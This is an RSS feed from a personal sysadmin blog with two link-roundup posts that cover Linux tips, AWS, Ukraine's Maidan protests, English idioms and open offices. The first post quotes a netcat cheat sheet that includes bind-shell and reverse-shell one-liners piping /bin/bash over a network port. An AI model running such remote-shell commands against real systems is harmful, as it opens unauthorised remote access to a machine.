@@ -1,0 +1,171 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>AWS &#8211; Ivan Pesin</title>
+	<atom:link href="/blog/tag/aws/feed/" rel="self" type="application/rss+xml" />
+	<link>https://pesin.space/blog</link>
+	<description>Articles &#38; Translations</description>
+	<lastBuildDate>
+	Wed, 19 Oct 2016 02:08:18 +0000	</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.1.1</generator>
+	<item>
+		<title>Links: Jan 19th</title>
+		<link>/blog/2014/01/links-jan-19th/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-jan-19th</link>
+				<pubDate>Sat, 18 Jan 2014 22:15:50 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[301]]></category>
+		<category><![CDATA[algorithms]]></category>
+		<category><![CDATA[auditd]]></category>
+		<category><![CDATA[Avatar]]></category>
+		<category><![CDATA[AWS]]></category>
+		<category><![CDATA[bootstrap]]></category>
+		<category><![CDATA[centos]]></category>
+		<category><![CDATA[data structures]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[LXC]]></category>
+		<category><![CDATA[Murphy]]></category>
+		<category><![CDATA[nc]]></category>
+		<category><![CDATA[netcat]]></category>
+		<category><![CDATA[open space]]></category>
+		<category><![CDATA[redirect]]></category>
+		<category><![CDATA[Ukraine]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2014/01/links-jan-19th/</guid>
+				<description><![CDATA[&#160; Okay, you&#8217;d think Murphy laws were jokes. But as situation in Ukraine shows most of them are true, aren&#8217;t they? If something can go wrong, it will. Left to themselves, things tend to go from bad to worse. When things just can&#8217;t get any worse, they will. All of this really saddens me and [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />&nbsp;</p>
+<p>Okay, you&#8217;d think Murphy laws were jokes. But as situation in Ukraine shows most of them are true, aren&#8217;t they?</p>
+<ul>
+<li><a href="http://www.economist.com/news/leaders/21591589-viktor-yanukovych-has-made-his-choice-his-country-has-chosen-otherwise-goodbye-putin?zid=307&amp;ah=5e80419d1bc9821ebe173f4f0f060a07">If something can go wrong, it will.</a></li>
+<li><a href="http://www.economist.com/blogs/easternapproaches/2014/01/ukraine?zid=307&amp;ah=5e80419d1bc9821ebe173f4f0f060a07">Left to themselves, things tend to go from bad to worse</a>.</li>
+<li><a href="http://www.economist.com/news/europe/21594340-viktor-yanukovychs-government-still-faces-proteststhough-smaller-ones-still-out-there">When things just can&#8217;t get any worse, they will</a>.</li>
+</ul>
+<p>All of this really saddens me and spoils good faith in further; but it does demonstrate the essence of real world and people&#8217;s desires. Turning though from harsh reality to wonders of virtual world, let&#8217;s start with few reminder links:</p>
+<ul>
+<li>How to see <a href="http://www.cyberciti.biz/tips/linux-audit-files-to-see-who-made-changes-to-a-file.html">what made changes</a> to a file using <b>auditd:</b></li>
+</ul>
+<blockquote><p>
+</p><pre class="crayon-plain-tag"># auditctl -w /etc/passwd -p war -k password-file
+# ausearch -f /etc/passwd</pre><p>
+</p></blockquote>
+<ul>
+<li>netcat <a href="http://injustfiveminutes.com/2013/11/19/netcat-cheat-sheet/">cheat sheet</a>:</li>
+</ul>
+<blockquote><p>Suppose you want to transfer a file &#8220;file.txt&#8221; from server A to client B.<br />
+<code>Server: $ nc -l 4444 &lt; file.txt<br />
+</code><code>Client: $ nc -n 192.168.1.100 4444 &gt; file.txt</code></p>
+<p>Suppose you want to transfer a file &#8220;file.txt&#8221; from client B to server A:<br />
+<code>Server: $ nc -l 4444 &gt; file.txt<br />
+Client: $ nc 192.168.1.100 4444 &lt; file.txt</code></p>
+<p>Remote shell:<br />
+<code>Server: $ nc -l 4444 -e /bin/bash -i<br />
+Client: $ nc 192.168.1.100 4444</code></p>
+<p>Reverse remote shell:<br />
+<code>Server: $ nc -l 4444<br />
+Client: $ nc 192.168.1.100 4444 -e /bin/bash</code></p></blockquote>
+<h3>Technology:</h3>
+<ul>
+<li>CentOS Project <a href="http://lists.centos.org/pipermail/centos-announce/2014-January/020100.html">joins forces</a> with Red Hat! Yay!</li>
+<li>I&#8217;m an SA. I hate 301 redirects. Here&#8217;s <a href="http://getluky.net/2010/12/14/301-redirects-cannot-be-undon/">why</a>. There&#8217;s also few ideas how to undo some of the harm.</li>
+<li>Basic <a href="http://cstheory.stackexchange.com/questions/19759/core-algorithms-deployed/19773?utm_content=bufferacb4a&amp;utm_source=buffer&amp;utm_medium=twitter&amp;utm_campaign=Buffer#19773">Data Structures and Algorithms</a> in the Linux kernel.</li>
+<li><a href="http://www.reddit.com/r/IAmA/comments/1e5o4p/iaman_exaws_engineer_ask_me_anything_about_the/">Ex-AWS engineer on AWS internals</a>, extremely interesting (thanks Serge!)</li>
+<li>Wonderful <a href="http://containerops.org/2013/11/19/lxc-networking/?utm_content=buffer9a57f&amp;utm_source=buffer&amp;utm_medium=twitter&amp;utm_campaign=Buffer">article on LXC</a> and the way its networking is organised.</li>
+<li>Very nice <a href="http://www.blacktie.co">free bootstrap themes</a>.</li>
+<li><a href="https://www.tbray.org/ongoing/When/201x/2014/01/01/Software-in-2014">Software in 2014</a> &#8212; <a href="https://www.tbray.org/ongoing/When/201x/2011/12/27/Type-Systems">Bánffy-Bray criteria</a> for selecting between static and dynamic type systems, everything over HTTP and concurrent, mobile and browser suck, and the client-side is a mess.</li>
+</ul>
+<h3>English:</h3>
+<ul>
+<li>For collection &#8212; <a href="https://www.maths.nottingham.ac.uk/personal/ibf/some.html">Murphy&#8217;s laws</a></li>
+<li><a href="http://www.economist.com/blogs/johnson/2010/09/word_inflation">Dead, or living too well</a>? Is linguistic inflation <a href="http://www.macmillandictionaryblog.com/is-linguistic-inflation-insanely-awesome">insanely awesome</a>?</li>
+<li><a href="http://www.macmillandictionaryblog.com/five-rules-of-thumb-for-polite-and-diplomatic-language">Five Rules of Thumb</a> for Polite and Diplomatic Language.</li>
+</ul>
+<h3>Other:</h3>
+<ul>
+<li>Physicist Lawrence Krauss gives a talk on our current picture of the universe, how it will end, and how it could have come from nothing. Very thrilling talk on cosmology:</li>
+</ul>
+<blockquote><p><center><br />
+<iframe width="625" height="352" src="https://www.youtube.com/embed/EjaGktVQdNg?feature=oembed" frameborder="0" allowfullscreen></iframe><br />
+</center></p></blockquote>
+<ul>
+<li>Open offices are an unfortunate misunderstanding. <a href="http://www.newyorker.com/online/blogs/currency/2014/01/the-open-office-trap.html">New Yorker</a>:</li>
+</ul>
+<blockquote><p>The open office was <a href="http://dwp.bigplanet.com/pdkconsulting/nss-folder/pdfdownloads1/New_DuffyTanis1993.pdf" target="_blank">originally conceived</a> by a team from Hamburg, Germany, in the nineteen-fifties, to facilitate communication and idea flow. But a growing body of evidence suggests that the open office undermines the very things that it was designed to achieve. In <a href="http://eab.sagepub.com/content/34/3/279" target="_blank">June, 1997,</a> a large oil and gas company in western Canada asked a group of psychologists at the University of Calgary to monitor workers as they transitioned from a traditional office arrangement to an open one. The psychologists assessed the employees’ satisfaction with their surroundings, as well as their stress level, job performance, and interpersonal relationships before the transition, four weeks after the transition, and, finally, six months afterward. The employees <strong>suffered according to every measure</strong>: the new space was disruptive, stressful, and cumbersome, and, instead of feeling closer, coworkers felt distant, dissatisfied, and resentful. Productivity fell.</p></blockquote>
+<p><span style="line-height: 1.5em;">When the Avatar was first released I was appalled by claims that it was touted as &#8216;totally original work from the mind of Cameron&#8217;. I was sure that many years ago I read strikingly similar story by some of well-known sci-fi writers, but was struggling to remember the name of either the novel or the author. There was the same paraplegic hero who telepathically connected with an artificially created life form in order to explore a harsh planet and get access to its resources. Doesn&#8217;t it sound similar to the Avatar&#8217;s plot?</span></p>
+<p>Recently I accidentally stumbled upon this novel &#8212; that was Poul Anderson&#8217;s <a href="http://en.wikipedia.org/wiki/Call_Me_Joe">Call Me Joe</a>, written in (!) 1957. This is a classic sci-fi masterpiece and I would recommend reading it any time.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: Dec 24</title>
+		<link>/blog/2013/12/links-dec-24/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-dec-24</link>
+				<pubDate>Tue, 24 Dec 2013 20:49:26 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[acoustic cryptanalysis]]></category>
+		<category><![CDATA[AWS]]></category>
+		<category><![CDATA[cfengine]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[high traffic]]></category>
+		<category><![CDATA[lviv]]></category>
+		<category><![CDATA[Maidan]]></category>
+		<category><![CDATA[mobile]]></category>
+		<category><![CDATA[nginx]]></category>
+		<category><![CDATA[promise theory]]></category>
+		<category><![CDATA[redid]]></category>
+		<category><![CDATA[RSA]]></category>
+		<category><![CDATA[salary]]></category>
+		<category><![CDATA[web history]]></category>
+		<category><![CDATA[Yaremche]]></category>
+		<category><![CDATA[yum]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2013/12/links-dec-24/</guid>
+				<description><![CDATA[Just when you think you’ve sorted things out it appears the whole world gone mad :-) Ukraine has got its next Maindan (that’s how we call a nation-wide protest here) and the time is even more scarce than it was. Here are few links to sum up and give you the taste: Goodbye, Putin The [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />Just when you think you’ve sorted things out it appears the whole world gone mad :-) Ukraine has got its next Maindan (that’s how we call a nation-wide protest here) and the time is even more scarce than it was. Here are few links to sum up and give you the taste:</p>
+<ul>
+<li><a href="http://www.economist.com/news/leaders/21591589-viktor-yanukovych-has-made-his-choice-his-country-has-chosen-otherwise-goodbye-putin">Goodbye, Putin</a></li>
+<li><a href="http://www.economist.com/news/europe/21591642-viktor-yanukovychs-botched-crackdown-protests-maidan-seemed-defy-common-sense">The birth of the nation?</a></li>
+<li><a href="http://www.economist.com/news/europe/21591897-under-its-current-government-ukraine-may-be-prize-not-worth-winning-putins-expensive-victory">Putin’s expensive victory</a></li>
+<li><a href="http://www.economist.com/blogs/easternapproaches/2013/12/ukraine-0">Scenes from Maindan</a></li>
+<li><a href="http://www.theguardian.com/world/2013/dec/15/ukraine-protests-analysis-two-nations">Ukraine: tale of two nations for country locked in struggle over whether to face east or west</a></li>
+<li><a href="http://www.theguardian.com/world/2013/dec/15/ukraine-protesters-return-central-kiev-eu-campaign">Ukraine protesters return en masse to central Kiev for pro-EU campaign</a></li>
+<li><a href="http://www.theguardian.com/world/2013/dec/17/ukraine-russia-leaders-talks-kremlin-loan-deal">Vladimir Putin offers Ukraine financial incentives to stick with Russia</a></li>
+</ul>
+<p>Some other, more conventional news:</p>
+<h2>Technology</h2>
+<ul>
+<li><a href="http://highscalability.com/blog/2013/12/16/22-recommendations-for-building-effective-high-traffic-web-s.html">22 recommendations</a> for building effective high-traffic web-sites. Concentrated knowledge and experience, very nice</li>
+<li><a href="http://highscalability.com/blog/2013/11/5/10-things-you-should-know-about-aws.html">10 things</a> you should know about AWS – time saving tips</li>
+<li><a href="http://blog.zachorr.com/nginx-setup/">Battle-ready Nginx</a> – a brief overview with explanations of some settings that can be tuned in order to improve Nginx performance.</li>
+<li>Reflections on <a href="http://blog.ingineering.it/post/67370710404/turning-requirements-into-promises">turning requirements into promises</a> and <a href="http://blog.ingineering.it/post/67444144353/scaling-agile-projects-using-promises">scaling agile projects using promises</a></li>
+<li>4k bit RSA keys being cracked by <a href="http://www.extremetech.com/extreme/173108-researchers-crack-the-worlds-toughest-encryption-by-listening-to-the-tiny-sounds-made-by-your-computers-cpu">acoustic cryptanalysis</a>, totally mad and scary world!</li>
+<li>yum now keeps the <a href="http://www.cyberciti.biz/faq/yum-history-command/">history</a> of its transactions, available with <code>yum history</code></li>
+<li>Link from the past: <a href="http://evolutionofweb.appspot.com/#/growth/day">Evolution of the web</a></li>
+<li>Mike Svoboda’s presentation on how CFEngine is used in LinkedIn: <a href="http://www.slideshare.net/MikeSvoboda/lisa-2013-sysopsapi-leveraging-inmemory-key-value-stores-for-large-scale-operations-with-redis-and-cfengine">slides</a> and <a href="http://www.youtube.com/watch?v=NCTSN5KOmbM">youtube</a></li>
+</ul>
+<h2>English</h2>
+<ul>
+<li><a href="http://www.macmillandictionaryblog.com/hit-the-nail-on-the-head">Bending over backwards to hit the nail on the head</a> – Have you got a bee in your bonnet about idioms? Do you bend over backwards to find opportunities to use them? If so, be careful not to go overboard; otherwise you might be at risk of putting your foot in it.</li>
+<li><a href="http://www.dailywritingtips.com/vice-versa-and-vis-a-vis/">Vice Versa and Vis-à-Vis</a> – get it right</li>
+</ul>
+<h2>Other</h2>
+<ul>
+<li>NYTimes article on <a href="http://www.nytimes.com/2013/10/20/travel/lvivs-and-a-familys-stories-in-architecture.html">Lviv’s history in architecture</a>.</li>
+<li>Triumph of ignorami lasted 7 days: Ukrainian ski resort <a href="http://www.bloomberg.com/news/2013-11-01/now-there-are-two-towns-that-ban-cell-service.html">outlawed</a> mobile phones based on citizens fantasies. Reminds me how bus and tram drivers were complaining they are receiving a radiation from newly installed GPS receivers (which do not emit any radiation by definition)</li>
+</ul>
+<p style="text-align: center;"><img class="aligncenter" alt="pay map" src="http://www.glassdoor.com/press/wp-content/files_mf/salarycomparison.usmap57.jpg" width="95%" height="95%" /><br />
+<img class="aligncenter" alt="pay list" src="http://www.glassdoor.com/blog/wp-content/uploads/25-Highest-Paying-Companies-for-Software-Engineers.jpg" width="90%" height="90%" /></p>
+]]></content:encoded>
+										</item>
+	</channel>
+</rss>
